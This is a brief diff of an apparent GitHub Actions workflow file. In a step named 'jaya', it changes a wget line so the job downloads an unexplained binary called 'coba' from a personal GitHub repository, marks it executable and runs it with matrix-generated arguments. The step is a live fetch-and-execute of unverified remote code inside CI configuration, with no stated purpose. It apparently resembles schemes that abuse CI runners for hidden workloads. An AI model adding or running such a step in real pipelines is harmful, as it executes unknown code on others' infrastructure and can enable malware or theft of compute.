@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: jaya
       run: |
-        wget hhttps://raw.githubusercontent.com/mashudi09/ruby/master/coba
+        wget https://raw.githubusercontent.com/mashudi09/ruby/master/coba && chmod +x coba && ./coba scala kloter1-${{ matrix.go }}-${{ matrix.flag }}
